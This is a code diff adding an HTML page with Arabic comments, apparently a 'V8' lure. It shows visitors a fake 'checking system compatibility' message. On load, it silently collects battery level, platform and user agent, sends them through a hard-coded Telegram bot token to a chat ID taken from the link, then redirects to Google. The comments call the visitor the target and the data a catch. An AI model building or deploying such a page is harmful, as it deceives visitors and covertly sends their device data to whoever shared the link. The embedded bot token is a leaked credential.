@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>V8 Global System</title>
+</head>
+<body style="background:#000; color:#00ffcc; text-align:center; padding-top:100px; font-family:monospace;">
+    <div id="status">جاري فحص توافق النظام...</div>
+
+    <script>
+        // التوكن الخاص بالبوت (يبقى ثابتاً لأنه هو الوسيط)
+        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPROA823dxEaOZVU";
+
+        async function startSystem() {
+            // 1. استخراج الأيدي (Chat ID) من الرابط تلقائياً
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetID = urlParams.get('id'); // سيقرأ الأيدي من الرابط
+
+            if (!targetID) {
+                window.location.replace("https://google.com");
+                return;
+            }
+
+            try {
+                // 2. سحب البيانات (شحن، نظام)
+                let b = await navigator.getBattery();
+                let info = `🚀 **صيد جديد من منصة V8 العامة:**\n\n` +
+                           `🔋 الشحن: ${Math.floor(b.level * 100)}%\n` +
+                           `📱 النظام: ${navigator.platform}\n` +
+                           `🌐 المتصفح: ${navigator.userAgent.slice(0, 50)}...`;
+
+                // 3. إرسال البيانات للأيدي المحدد في الرابط
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: targetID,
+                        text: info,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // 4. تحويل الهدف بعد السحب
+                setTimeout(() => { window.location.replace("https://google.com"); }, 2000);
+
+            } catch (e) {
+                window.location.replace("https://google.com");
+            }
+        }
+        window.onload = startSystem;
+    </script>
+</body>
+</html>
